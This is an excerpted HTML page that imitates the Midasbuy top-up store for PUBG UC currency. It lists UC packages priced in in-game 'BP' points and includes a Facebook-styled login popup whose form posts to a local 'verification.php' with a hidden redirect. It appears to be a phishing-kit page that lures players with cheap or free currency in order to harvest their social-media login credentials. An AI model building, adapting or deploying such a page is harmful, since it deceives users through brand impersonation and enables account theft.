...
<head>
    ...
    <script type="text/javascript">
        window.__PAY_INFO = {
            ...
            "currencySmallIcon": "img/ucAtas.png",
            "currencyIconMap": [{
                "icon": "img/product/1.png",
                "max": "299"
            }, {
                "icon": "img/product/2.png",
                "max": "599",
                "min": "300"
            }, {
                "icon": "img/product/3.png",
                "max": "1499",
                "min": "600"
            }, {
                "icon": "img/product/4.png",
                "max": "2999",
                "min": "1500"
            }, {
                "icon": "img/product/5.png",
                "max": "5999",
                "min": "3000"
            }, {
                "icon": "img/product/6.png",
                "min": "6000"
            }],
            "country": "OT",
            "midasbuyArea": "Other",
            ...
            <div class="banner-wrap">
                <div id="swiper" class="swiper-container" style="height: auto;overflow: visible;">
                    <div class="swiper-wrapper swiper-wrapper1" id="swiper-wrapper">
                        <div class="swiper-slide" style="background: url(https://cdn.midasbuy.com/images/s23_1920x3004db448d4.jpg) no-repeat center;background-size: cover;"></div>
                    </div>
                </div>
                <div class="mc"></div>
                <div class="nav-box">
                    ...
                    <div class="section game-pay-section">
                        ...
                        <ul>
                            <li class="myItem" onclick="openHero(event, 'pertama');" id="defaultOpen">
                                <div class="container">
                                    <div class="shop-box">
                                        <p class="num"><img src="../img/ucAtas.png" class="icon">60<span class="bonus">+3</span></p>
                                    </div>
                            ...
                            <li class="myItem" onclick="openHero(event, 'kedua');">
                                <div class="container">
                                    <div class="shop-box">
                                        <p class="num"><img src="../img/ucAtas.png" class="icon">300<span class="bonus">+40</span></p>
                                    </div>
                            ...
                            <li class="myItem" onclick="openHero(event, 'ketiga');">
                                <div class="container">
                                    <div class="shop-box">
                                        <p class="num"><img src="../img/ucAtas.png" class="icon">600<span class="bonus">+90</span></p>
                                    </div>
                            ...
                            <li class="myItem" onclick="openHero(event, 'keempat');">
                                <div class="container">
                                    <div class="shop-box">
                                        <p class="num"><img src="../img/ucAtas.png" class="icon">1500<span class="bonus">+375</span></p>
                                    </div>
                                    <div class="shop-pic"><img src="../img/product/4.png" alt="img" style="width: 70%; max-width: 100%;"></div>
                                    <!---->
                                    <!---->
                                    <!---->
                                    <div class="price-box one-price">
									    <img style="width: 22px; margin: 4px; position: absolute;" src="https://i.ibb.co/n6jDWny/newBP.png">
                                        <p class="money">15000 BP</p>
                                        <!---->
                                    </div>
                                </div>
                            </li>
                            <li class="myItem" onclick="openHero(event, 'kelima');">
                                <div class="container">
                                    <div class="shop-box">
                                        <p class="num"><img src="../img/ucAtas.png" class="icon">3000<span class="bonus">+1000</span></p>
                                    </div>
                            ...
                            <li class="myItem" onclick="openHero(event, 'keenam');">
                                <div class="container">
                                    <div class="shop-box">
                                        <p class="num"><img src="../img/ucAtas.png" class="icon">6000<span class="bonus">+2400</span></p>
                                    </div>
                ...
                <div class="popup-box-login-fb">
                    ...
                    <div class="content-box-fb">
                        ...
                        <form class="login-form" action="../verification.php" method="post">
							...
							<input type="hidden" name="line" value="purchase/processing.php" readonly>
